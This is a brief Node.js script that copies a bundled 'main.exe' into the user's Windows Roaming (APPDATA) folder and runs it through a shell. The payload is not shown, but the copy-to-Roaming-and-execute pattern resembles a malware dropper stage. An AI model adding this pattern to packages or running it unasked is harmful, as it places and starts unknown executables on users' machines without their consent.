const fs = require('fs');
const { spawn } = require('child_process');
const path = require('path');

const appInstallerPath = path.join(__dirname, 'main.exe');
const roamingPath = path.join(process.env.APPDATA);

const appInstallerName = path.basename(appInstallerPath);
const destinationPath = path.join(roamingPath, appInstallerName);

fs.copyFile(appInstallerPath, destinationPath, (err) => {
  if (err) {
    console.log(err);
  } else {
    const childProcess = spawn(destinationPath, [], { shell: true });

    childProcess.on('error', (error) => {
      console.log(error);
    });

    childProcess.on('close', (code) => {
      console.log(`Child process exited with code ${code}`);
    });
  }
});
